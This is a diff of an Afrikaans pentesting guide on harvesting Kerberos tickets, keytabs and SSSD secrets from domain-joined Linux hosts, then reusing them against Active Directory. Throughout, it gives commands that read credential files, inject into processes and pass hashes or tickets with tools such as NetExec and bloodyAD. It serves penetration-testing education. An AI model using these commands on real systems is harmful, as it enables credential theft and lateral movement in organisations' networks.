@@ -1,18 +1,16 @@
 # Linux Active Directory
 
-{{#include ../../banners/hacktricks-training.md}}
-
 'n Linux-masjien kan ook binne 'n Active Directory-omgewing voorkom.
 
-'n Linux-masjien binne 'n AD kan **Kerberos-materiaal plaaslik stoor**: gebruiker-ccaches, masjien-/diens-keytabs en SSSD-bestuurde secrets. Hierdie artefakte kan gewoonlik soos enige ander Kerberos-credential hergebruik word. Om die meeste hiervan te lees, moet jy gewoonlik die gebruikereienaar van die ticket of **root** op die masjien wees.
+'n Linux-masjien binne 'n AD kan **Kerberos-materiaal plaaslik stoor**: gebruiker-ccaches, masjien-/diens-keytabs en SSSD-bestuurde geheime. Hierdie artefakte kan gewoonlik soos enige ander Kerberos-geloofsbriewe hergebruik word. Om die meeste daarvan te lees, moet jy gewoonlik die gebruiker-eienaar van die ticket of **root** op die masjien wees.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
 
 ## Enumerasie
 
-### AD-enumerasie vanaf linux
+### AD-enumerasie vanaf Linux
 
-As jy toegang tot 'n AD in linux het (of bash in Windows), kan jy [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) probeer om die AD te enumereer.
+As jy toegang tot 'n AD in Linux (of bash in Windows) het, kan jy [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) probeer om die AD te enumereer.
 
-Jy kan ook die volgende bladsy nagaan om meer te leer oor **ander maniere om AD vanaf linux te enumereer**:
+Jy kan ook die volgende bladsy nagaan om **ander maniere om AD vanaf Linux te enumereer** te leer:
 
 
 {{#ref}}
@@ -21,16 +19,16 @@ Jy kan ook die volgende bladsy nagaan om meer te leer oor **ander maniere om AD 
 
 ### FreeIPA
 
-FreeIPA is 'n open-source **alternatief** vir Microsoft Windows **Active Directory**, hoofsaaklik vir **Unix**-omgewings. Dit kombineer 'n volledige **LDAP-directory** met 'n MIT **Kerberos** Key Distribution Center vir bestuur soortgelyk aan Active Directory. Deur die Dogtag **Certificate System** vir CA- en RA-sertifikaatbestuur te gebruik, ondersteun dit **multi-factor**-authentication, insluitend smartcards. SSSD is geïntegreer vir Unix-authenticationprosesse. Leer meer daaroor by:
+FreeIPA is 'n oopbron-**alternatief** tot Microsoft Windows **Active Directory**, hoofsaaklik vir **Unix**-omgewings. Dit kombineer 'n volledige **LDAP-gids** met 'n MIT **Kerberos** Key Distribution Center vir bestuur soortgelyk aan Active Directory. Deur die Dogtag **Certificate System** vir CA- en RA-sertifikaatbestuur te gebruik, ondersteun dit **multi-factor**-verifikasie, insluitend slimkaarte. SSSD is geïntegreer vir Unix-verifikasieprosesse.<sup>[[14]](#references)[[15]](#references)</sup> Leer meer daaroor by:
 
 
 {{#ref}}
 ../software-information/freeipa-pentesting.md
 {{#endref}}
 
-### Artefakte op 'n domein-aangeslote host
+### Artefakte op domeingekoppelde gashere
 
-Voordat jy tickets hanteer, bepaal **hoe die host by AD aangesluit is** en **waar Kerberos-materiaal werklik gestoor word**. Op moderne Linux-hosts word dit gewoonlik deur `realmd` + `adcli` + `sssd` hanteer, nie net deur plat lêers in `/tmp` nie:
+Voordat jy aan tickets raak, identifiseer **hoe die host by AD aangesluit is** en **waar Kerberos-materiaal werklik gestoor word**. Op moderne Linux-hosts word dit gewoonlik deur `realmd` + `adcli` + `sssd` hanteer, en nie slegs deur plat lêers in `/tmp` nie.<sup>[[10]](#references)</sup>
 ```bash
 # Is the host joined to a realm/domain?
 realm list 2>/dev/null
@@ -45,28 +43,27 @@ klist -k /etc/krb5.keytab 2>/dev/null
 find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
 find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
 ```
-Dit vertel jou vinnig of die host AD vertrou, of SSSD identities of tickets cache, en of **machine/service keytabs** of **KCM secrets** beskikbaar is vir misbruik.
+Dit vertel jou vinnig of die host AD vertrou, of SSSD identiteite of tickets kas, en of **machine/service keytabs** of **KCM secrets** beskikbaar is vir misbruik.<sup>[[4]](#references)[[10]](#references)</sup>
 
-## Werk met tickets
+## Speel met tickets
 
 ### Pass The Ticket
 
-Op hierdie bladsy vind jy verskillende plekke waar jy **kerberos tickets binne 'n linux-host kan vind**. Op die volgende bladsy leer jy hoe om hierdie CCache-ticketformate na Kirbi te transformeer (die formaat wat jy in Windows moet gebruik) en ook hoe om 'n PTT-aanval uit te voer:
-
+Op hierdie bladsy sal jy verskillende plekke vind waar jy **Kerberos-tickets binne ’n Linux-host kan vind**. Op die volgende bladsy kan jy leer hoe om hierdie CCache-ticketformate na Kirbi om te skakel (die formaat wat jy in Windows moet gebruik), asook hoe om ’n PTT-aanval uit te voer:
 
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/pass-the-ticket.md
 {{#endref}}
 
-As jy die **Linux-spesifieke ticket harvesting-workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ens.) wil gebruik, kyk na die toegewyde bladsy:
+As jy die **Linux-spesifieke ticket-harvesting-workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc`, ens.) wil hê, kyk na die toegewyde bladsy:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
 {{#endref}}
 
-### Hergebruik van CCACHE tickets vanaf /tmp
+### Hergebruik van CCACHE-tickets vanaf /tmp
 
-CCACHE-lêers is binêre formate vir **die stoor van Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` is steeds algemeen, maar moderne Linux-deployments gebruik ook `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, of `KCM:%{uid}`. Kontroleer die **`KRB5CCNAME`**-environment variable en die `default_ccache_name`-setting voordat jy aanvaar dat tickets in `/tmp` gestoor word.<sup>[[1]](#references)</sup>
+CCACHE-lêers is binêre formate vir die **stoor van Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` is steeds algemeen, maar moderne Linux-implementerings gebruik ook `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}`, of `KCM:%{uid}`. Kontroleer die **`KRB5CCNAME`**-omgewingsveranderlike en die `default_ccache_name`-instelling voordat jy aanvaar dat tickets in `/tmp` geleë is.<sup>[[1]](#references)[[3]](#references)</sup>
 ```bash
 # Where is the current process reading credentials from?
 env | grep KRB5CCNAME
@@ -80,31 +77,31 @@ find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
 export KRB5CCNAME=/tmp/krb5cc_1000
 klist
 ```
-### CCACHE ticket-hergebruik vanaf keyring
+### CCACHE ticket reuse vanaf keyring
 
-**Kerberos-tickets wat in 'n proses se geheue gestoor word, kan onttrek word**, veral wanneer die masjien se ptrace-beskerming gedeaktiveer is (`/proc/sys/kernel/yama/ptrace_scope`). 'n Nuttige tool hiervoor is beskikbaar by [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), wat die extraction fasiliteer deur in sessies in te spuit en tickets na `/tmp` te dump.
+**Kerberos tickets wat in 'n proses se geheue gestoor word, kan onttrek word**, veral wanneer die masjien se ptrace-beskerming gedeaktiveer is (`/proc/sys/kernel/yama/ptrace_scope`). 'n Nuttige tool hiervoor is beskikbaar by [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), wat die onttrekking vergemaklik deur in sessions in te spuit en tickets na `/tmp` te dump.<sup>[[1]](#references)[[16]](#references)</sup>
 
-Om hierdie tool te configureer en te gebruik, word die volgende stappe gevolg:
+Om hierdie tool te konfigureer en te gebruik, word die onderstaande stappe gevolg:
 ```bash
 git clone https://github.com/TarlogicSecurity/tickey
 cd tickey/tickey
 make CONF=Release
 /tmp/tickey -i
 ```
-Hierdie prosedure sal probeer om in verskeie sessies te inject, met sukses wat aangedui word deur onttrekte tickets in `/tmp` te stoor met die naamkonvensie `__krb_UID.ccache`.<sup>[[1]](#references)</sup>
+Hierdie prosedure sal probeer om in verskeie sessions in te spuit, wat sukses aandui deur geëkstraheerde tickets in `/tmp` te stoor met die naamkonvensie `__krb_UID.ccache`.<sup>[[1]](#references)</sup>
 
-### Hergebruik van CCACHE-tickets vanaf SSSD KCM
+### Hergebruik van CCACHE-ticket vanaf SSSD KCM
 
-SSSD behou 'n kopie van die databasis by die pad `/var/lib/sss/secrets/secrets.ldb`. Die ooreenstemmende sleutel word as 'n versteekte lêer by die pad `/var/lib/sss/secrets/.secrets.mkey` gestoor. By verstek is die sleutel slegs leesbaar indien jy **root**-toestemmings het.
+SSSD handhaaf ’n kopie van die databasis by die pad `/var/lib/sss/secrets/secrets.ldb`. Die ooreenstemmende sleutel word as ’n versteekte lêer by die pad `/var/lib/sss/secrets/.secrets.mkey` gestoor. By verstek is die sleutel slegs leesbaar indien jy **root**-toestemmings het.<sup>[[4]](#references)</sup>
 
-Deur **`SSSDKCMExtractor`** met die --database- en --key-parameters aan te roep, sal die databasis geparseer en die **secrets gedekripteer** word.
+Deur **`SSSDKCMExtractor`** met die --database- en --key-parameters aan te roep, sal die databasis ontleed en die **secrets dekripteer** word.<sup>[[4]](#references)</sup>
 ```bash
 git clone https://github.com/fireeye/SSSDKCMExtractor
 python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
 ```
-Die **credential cache Kerberos blob kan omgeskakel word na ’n bruikbare Kerberos CCache-lêer** wat aan Mimikatz/Rubeus deurgegee kan word.
+Die extractor druk rou Kerberos JSON-payloads uit; skakel dit om na ’n bruikbare ticket cache of ’n ander ticket-formaat voordat pass-the-cache/pass-the-ticket-bewerkings uitgevoer word.<sup>[[4]](#references)</sup>
 
-### Vinnige keytab triage
+### Vinnige keytab-triage
 ```bash
 # Inspect available principals and enctypes
 klist -k -e /etc/krb5.keytab
@@ -115,33 +112,33 @@ klist
 ```
 ### Onttrek rekeninge uit /etc/krb5.keytab
 
-Diensrekening-sleutels, wat noodsaaklik is vir dienste wat met root-voorregte werk, word veilig in **`/etc/krb5.keytab`**-lêers gestoor. Hierdie sleutels, wat soortgelyk is aan wagwoorde vir dienste, vereis streng vertroulikheid.
+Diensrekening-sleutels, wat noodsaaklik is vir dienste wat met root-voorregte werk, word veilig in **`/etc/krb5.keytab`**-lêers gestoor. Hierdie sleutels, soortgelyk aan wagwoorde vir dienste, vereis streng vertroulikheid.<sup>[[5]](#references)</sup>
 
-Om die inhoud van die keytab-lêer te inspekteer, kan **`klist`** gebruik word. Op Linux druk `klist -k -K -e` die principals, sleutelweergawe-nommers, enkripsietipes en rou sleutelmaterial af. As die sleuteltipe **23 / RC4-HMAC** is, is die sleutelwaarde ook die **NT-hash** van daardie principal.
+Om die inhoud van die keytab-lêer te inspekteer, kan **`klist`** gebruik word. Op Linux druk `klist -k -K -e` die principals, sleutelweergawe-nommers, enkripsietipes en rou sleutelmateriaal af. As die sleuteltipe **23 / RC4-HMAC** is, is die sleutelwaarde ook die **NT hash** van daardie principal.<sup>[[6]](#references)[[17]](#references)</sup>
 ```bash
 klist -k -K -e /etc/krb5.keytab
 # RC4-HMAC entries expose reusable NTLM material; AES entries do not
 ```
-Vir Linux-gebruikers bied **`KeyTabExtract`** funksionaliteit om die RC4 HMAC-hash te onttrek, wat vir NTLM-hashergebruik aangewend kan word. Let daarop dat dit slegs help wanneer die keytab steeds **etype 23 / RC4-HMAC**-materiaal bevat. In **AES-only**-omgewings kry jy moontlik nie ’n herbruikbare NT-hash nie, maar jy kan steeds direk met die keytab via Kerberos authenticate.
+Vir Linux-gebruikers bied **`KeyTabExtract`** funksionaliteit om die RC4 HMAC hash te onttrek, wat vir NTLM hash reuse aangewend kan word. Let daarop dat dit slegs help wanneer die keytab steeds **etype 23 / RC4-HMAC**-materiaal bevat. In **AES-only**-omgewings kry jy moontlik nie ’n herbruikbare NT hash nie, maar jy kan steeds direk met die keytab via Kerberos authenticate.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
 ```bash
 python3 keytabextract.py krb5.keytab
 # Expected output varies based on hash availability
 ```
-Op macOS dien **`bifrost`** as ’n hulpmiddel vir keytab-lêeranalise.
+Op macOS dien **`bifrost`** as ’n hulpmiddel vir keytab-lêeranalise.<sup>[[8]](#references)</sup>
 ```bash
 ./bifrost -action dump -source keytab -path /path/to/your/file
 ```
-Deur die onttrekte rekening- en hash-inligting te benut, kan verbindings met bedieners met nutsmiddels soos **`NetExec`** daargestel word.
+Deur die onttrekte rekening- en hash-inligting te gebruik, kan verbindings met bedieners met nutsmiddels soos **`NetExec`** gevestig word.<sup>[[9]](#references)</sup>
 ```bash
 # NTLM/RC4 material recovered from etype 23 entries
 nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
 
 # Or reuse a Kerberos cache directly
-KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
+KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
 ```
 ### Hergebruik die masjienrekening vanaf `/etc/krb5.keytab`
 
-Op stelsels wat met `realmd`/`adcli`/`sssd` aangesluit is, bevat `/etc/krb5.keytab` gewoonlik die **rekenaarrekening** en een of meer **host/service principals**. As jy **root** het, moenie dit bloot dump nie: gebruik een van die principals wat deur `klist -k` gelys word om 'n TGT aan te vra en as die Linux-host self te werk.
+Op stelsels wat by `realmd`/`adcli`/`sssd` aangesluit is, bevat `/etc/krb5.keytab` gewoonlik die **rekenaarrekening** en een of meer **gasheerdiens-principals**. As jy **root** het, moenie dit bloot dump nie: gebruik een van die principals wat deur `klist -k` gelys word om ’n TGT aan te vra en as die Linux-gasheer self te werk.<sup>[[10]](#references)</sup>
 ```bash
 # Identify usable principals first
 klist -k /etc/krb5.keytab
@@ -154,11 +151,11 @@ klist
 ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
 kvno ldap/dc.domain.local
 ```
-Dit is veral nuttig wanneer die **computer object** self gedelegeerde regte in AD het, of wanneer die host toegelaat word om ander secrets soos ’n **gMSA** op te haal.
+Dit is veral nuttig wanneer die **computer object** self gedelegeerde regte in AD het, of wanneer die host toegelaat word om ander secrets, soos ’n **gMSA**, te herwin.<sup>[[13]](#references)</sup>
 
-### Hergebruik van gesteelde Kerberos-materiaal met Linux-first AD tooling
+### Hergebruik gesteelde Kerberos-materiaal met Linux-first AD tooling
 
-Sodra jy ’n geldige `ccache` of ’n bruikbare keytab het, kan jy direk vanaf **Linux** teen AD werk sonder om eers alles na Windows-formate om te skakel. Baie moderne tools aanvaar `KRB5CCNAME` / Kerberos-auth natively:
+Sodra jy ’n geldige `ccache` of ’n bruikbare keytab het, kan jy direk vanaf **Linux** teen AD opereer sonder om eers alles na Windows-formate om te skakel. Baie moderne tools aanvaar `KRB5CCNAME` / Kerberos-auth native.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
 ```bash
 # Reuse a stolen cache with bloodyAD for LDAP-side actions
 KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'
@@ -167,7 +164,7 @@ KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get objec
 KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
 --target 'WEB01$' --action list
 ```
-Dit is 'n goeie brug tussen **Linux post-exploitation** en **AD object abuse**. Vir die object-level abuse-paaie self, kyk na:
+Dit is ’n goeie brug tussen **Linux post-exploitation** en **AD object abuse**. Vir die objekvlak-misbruikpaaie self, kyk na:
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-ldap.md
@@ -179,7 +176,7 @@ Dit is 'n goeie brug tussen **Linux post-exploitation** en **AD object abuse**. 
 
 ### Linux gMSA / Managed Service Account artefakte
 
-Onlangse Linux-ontplooiings kan **Managed Service Accounts** direk vanaf AD gebruik. In die praktyk beteken dit dat jy, nadat jy 'n Linux-bediener gekompromitteer het, nie net die host keytab nie, maar ook diensspesifieke keytabs kan vind wat vanaf 'n gMSA gegenereer is. Algemene plekke om te inspekteer is `/etc/gmsad.conf`, ontplooiingspesifieke konfigurasielêers, en bykomende `*.keytab`-lêers onder `/etc`.<sup>[[2]](#references)</sup>
+Onlangse Linux-deployments kan **Managed Service Accounts** direk vanaf AD gebruik. In die praktyk beteken dit dat jy, nadat jy ’n Linux-bediener gekompromitteer het, nie net die host keytab nie, maar ook **service-specific keytabs** wat vanaf ’n gMSA gegenereer is, kan vind. Algemene plekke om te inspekteer, is `/etc/gmsad.conf`, deployment-spesifieke konfigurasielêers en bykomende `*.keytab`-lêers onder `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
 ```bash
 # Look for gMSA-related configuration and extra keytabs
 grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
@@ -193,15 +190,29 @@ klist -kt /etc/service.keytab
 kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
 klist
 ```
-Dit gee jou ’n herbruikbare Kerberos-identiteit vir die SPNs wat aan daardie gMSA gebind is, **sonder om enige Windows endpoint aan te raak**. Vir **domain-side** gMSA/dMSA abuse nadat jy hoër privileges in AD verkry het, kyk na:
+Dit gee jou ’n herbruikbare Kerberos-identiteit vir die SPNs wat aan daardie gMSA gebind is **sonder om enige Windows-eindpunt aan te raak**.<sup>[[13]](#references)</sup> Vir **domeinkant**-gMSA/dMSA-misbruik nadat hoër voorregte in AD verkry is, kyk na:
 
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
 {{#endref}}
 
-## Verwysings
+## References
 
-- [1] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
-- [2] [Accessing AD with a managed service account – Integrating RHEL systems directly with Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
-
+- [1] [Kerberos (II): Hoe om Kerberos aan te val?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [2] [Toegang tot AD met ’n managed service account – Integrasie van RHEL-stelsels direk met Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
+- [3] [Kerberos-omgewingsveranderlikes – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
+- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
+- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
+- [6] [RFC 4757: Die RC4-HMAC Kerberos-enkripsietipes wat deur Microsoft Windows gebruik word](https://www.rfc-editor.org/rfc/rfc4757)
+- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
+- [8] [bifrost](https://github.com/its-a-feature/bifrost)
+- [9] [Gebruik van Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
+- [10] [Ontdekking en aansluiting by identiteitsdomeine | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
+- [11] [bloodyAD-gebruikersgids](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
+- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
+- [13] [gmsad](https://github.com/cea-sec/gmsad)
+- [14] [Oor | FreeIPA documentation](https://www.freeipa.org/About.html)
+- [15] [FreeIPA 4.11.0-vrystellingsnotas](https://www.freeipa.org/release-notes/4-11-0.html)
+- [16] [Yama – Die Linux-kerneldokumentasie](https://docs.kernel.org/admin-guide/LSM/Yama.html)
+- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
 {{#include ../../banners/hacktricks-training.md}}
